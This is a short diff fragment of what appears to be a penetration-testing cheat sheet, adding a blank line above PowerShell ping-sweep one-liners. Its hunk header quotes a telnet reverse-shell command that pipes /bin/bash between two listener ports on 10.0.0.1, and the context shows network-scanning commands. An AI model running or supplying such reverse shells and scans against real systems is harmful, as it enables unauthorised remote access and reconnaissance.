@@ -36,6 +36,7 @@ Box 2: $ telnet 10.0.0.1 4444 | /bin/bash | telnet 10.0.0.1 4445
 
 #### Powershell
 Ping sweep:
+
     PS C:\> 1..255 | % {ping –n 1 10.10.10.$_ | sls ttl}
     1..255 | % {echo "10.10.10.$_"; ping -n 1 -w 100 10.10.10.$_ | select-string ttl}
 
